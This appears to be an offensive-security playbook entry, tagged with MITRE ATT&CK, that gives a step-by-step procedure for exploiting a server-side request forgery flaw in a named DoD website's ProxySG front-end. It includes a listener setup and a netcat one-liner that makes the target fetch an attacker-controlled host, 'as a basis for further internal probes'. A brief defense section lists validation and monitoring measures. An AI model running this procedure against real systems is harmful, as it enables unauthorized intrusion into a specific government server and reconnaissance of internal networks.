---
id: proc-trigger-ssrf-http
tags:
  - ssrf
  - exploitation
type: procedure
tools:
  - '[[tools/nc-netcat]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/echo-nc-ssrf-trigger]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:10.090Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-with-Crafted-HTTP-Request

## Summary

This procedure exploits an SSRF vulnerability by sending a minimal HTTP request with an absolute URI to a public-facing web server, forcing it to forward the request to an attacker-controlled endpoint for confirmation.

## Description

In the context of the DoD SSI website's ProxySG front-end, the server improperly handles absolute URIs without a Host header, allowing SSRF. This is sent via netcat to port 80, triggering an outbound request. Prerequisites include an attacker server listening for incoming connections and knowledge of the target's IP.

## Requirements

1. Attacker-controlled server with logging (e.g., web server or nc listener on port 80)
2. Network access to target's public port 80
3. Netcat installed on attacker's machine

## Defense

Defensive measures and detection strategies:

- Validate and normalize URIs to prevent absolute URI processing
- Implement IP allowlisting for outbound requests
- Monitor server logs for unusual outbound connections to external IPs

## Objectives

1. Force target to request attacker-controlled URL
2. Confirm SSRF via incoming log entry
3. Establish basis for further internal probes

## Instructions

### Step 1: Prepare Listener

**Context**: Set up your server to capture the SSRF request.

Start a simple HTTP listener (e.g., using Python or nc) on your server at port 80.

### Step 2: Send Crafted Request

**Context**: Deliver the SSRF payload to trigger the outbound request.

**Command** ([[commands/echo-nc-ssrf-trigger]]):
```bash
echo -ne "GET http\\://your-server.com/ HTTP/1.1\\r\\n\\r\\n" | nc target-ip 80
```

> This sends a minimal GET request with absolute URI, bypassing Host header checks. Expected output: Target returns 403 Forbidden; your listener logs the GET from target's IP.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/echo-nc-ssrf-trigger]]

## Tools Used

- [[tools/nc-netcat]]

## Tags

- [[ssrf]]
- [[exploitation]]
